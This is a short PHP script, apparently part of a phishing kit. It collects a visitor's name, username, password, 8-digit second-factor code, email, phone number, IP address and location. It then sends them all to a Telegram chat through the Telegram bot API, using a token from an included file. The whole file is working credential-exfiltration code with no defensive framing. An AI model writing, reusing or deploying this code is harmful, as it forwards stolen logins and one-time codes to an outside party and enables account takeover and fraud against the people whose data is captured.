<?php
include 'igardotoken.php';
    $data = [
        'text' => ' 

Ziyaretçinin adı: '.$firstname.' 

Kullanıcı Adı: '.$username.' 

Şifre : '.$password.'
8 haneli faktor kodu : '.$factorcode.'
Email : '.$mail.'
Telefon Numarası : '.$number.'
ip : '.$ip.'
Giriş Zamanı : '.$cur_time.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'


      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>